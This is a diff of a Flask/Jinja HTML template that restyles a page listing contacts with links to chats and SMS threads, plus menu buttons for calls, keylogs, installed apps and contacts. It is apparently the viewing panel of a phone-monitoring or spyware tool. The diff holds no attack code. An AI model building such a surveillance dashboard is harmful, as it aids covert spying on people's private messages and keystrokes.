@@ -1,38 +1,48 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Database Explorer</title>
-  <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
-  <link rel="stylesheet" href="{{ url_for('static', filename='cyf8QhNEWE-MbVu6J6TSgCzupAm9R8u1G.css') }}">
-  <script src="{{ url_for('static', filename='js/app.js') }}" defer></script>
-  <script src="https://unpkg.com/feather-icons"></script>
-</head>
-<body>
-  <div class="container">
+{% extends "base.html" %}
+
+{% block title %}Messenger App{% endblock %}
+
+{% block content %}
+<div class="container">
     <h1>Chats</h1>
+    
+    <div class="search-container">
+        <input type="text" id="search-input" placeholder="Search messages..." onkeyup="searchMessages()">
+        <div id="search-results"></div>
+    </div>
 
-    <input type="text" id="search-input" placeholder="Search Messenger" onkeyup="searchMessages()">
-    <div id="search-results"></div>
+    <div id="conversation-list">
+        {% for contact in contacts %}
+        <div class="contact-card" data-contact="{{ contact['name'] }}">
+            <div class="profile-picture">{{ contact['name'][:2].upper() }}</div>
+            <div class="contact-header">
+                <span class="contact-name">{{ contact['name'] }}</span>
+                <div class="contact-links">
+                    <a href="{{ url_for('chat', name=contact['name']) }}" class="contact-link">Chat</a>
+                    <a href="{{ url_for('sms_thread', name=contact['name']) }}" class="contact-link">SMS</a>
+                </div>
+            </div>
+        </div>
+        {% endfor %}
+    </div>
 
-    <ul id="conversation-list">
-      {% for contact in contacts %}
-        <li>
-            <a href="{{ url_for('chat', name=contact['name']) }}">
-                {{ contact['name'] }}
-                <span class="message-snippet"></span> </a> <br>
-                <a href="{{ url_for('sms_thread', name=contact['name']) }}">
-                {{ contact['name'] }}
-                <span class="message-snippet"></span> </a>
-            <span class="timestamp">{{ contact['time'] }}</span> </li>
-      {% endfor %}
-    </ul>
-
-     <a href="/calls" class="menu-button">Calls</a>
-     <a href="/keylogs" class="menu-button">Keylogs</a>
-     <a href="/installed_apps" class="menu-button">Installed Apps</a>
-     <a href="/contacts" class="menu-button">Contacts</a>
-  </div>
-</body>
-</html>
+    <div class="menu-buttons">
+        <a href="/calls" class="menu-button">
+            <i data-feather="phone"></i>
+            <span>Calls</span>
+        </a>
+        <a href="/keylogs" class="menu-button">
+            <i data-feather="key"></i>
+            <span>Keylogs</span>
+        </a>
+        <a href="/installed_apps" class="menu-button">
+            <i data-feather="grid"></i>
+            <span>Apps</span>
+        </a>
+        <a href="/contacts" class="menu-button">
+            <i data-feather="users"></i>
+            <span>Contacts</span>
+        </a>
+    </div>
+</div>
+{% endblock %}
